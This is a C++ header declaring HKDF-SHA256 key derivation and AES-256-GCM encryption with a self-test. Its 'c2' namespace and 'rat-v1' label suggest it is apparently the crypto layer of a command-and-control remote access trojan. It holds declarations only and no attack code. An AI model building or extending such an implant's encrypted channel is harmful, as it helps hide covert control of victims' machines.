// crypto.h — BCrypt 实现：HKDF-SHA256 会话密钥派生 + AES-256-GCM 加解密
#pragma once

#include <cstdint>
#include <cstddef>
#include <string>
#include <vector>

namespace c2
{

    // HKDF-SHA256（RFC 5869）：ikm=PSK, salt=client_nonce||server_nonce, info="rat-v1"
    std::vector<uint8_t> hkdf_sha256(const uint8_t *ikm, size_t ikm_len,
                                     const uint8_t *salt, size_t salt_len,
                                     const uint8_t *info, size_t info_len,
                                     size_t out_len);

    // 派生会话密钥（协议 §4），返回 kSessionKeyLen 字节
    std::vector<uint8_t> derive_session_key(const uint8_t *psk, size_t psk_len,
                                            const uint8_t *client_nonce,
                                            const uint8_t *server_nonce);

    // AES-256-GCM：返回 nonce(12) + ciphertext + tag(16)
    bool aes_gcm_encrypt(const uint8_t *key, size_t key_len,
                         const uint8_t *plaintext, size_t plaintext_len,
                         std::vector<uint8_t> &out, std::string &err);

    // 解密 aes_gcm_encrypt 的输出；GCM tag 校验失败返回 false
    bool aes_gcm_decrypt(const uint8_t *key, size_t key_len,
                         const uint8_t *sealed, size_t sealed_len,
                         std::vector<uint8_t> &out, std::string &err);

    // 自检：用 docs/protocol.md §7 测试向量交叉验证（固定输入）
    // 与 c2/internal/protocol/testdata/vectors.json 保持一致。
    bool crypto_selftest(std::string &err);

} // namespace c2
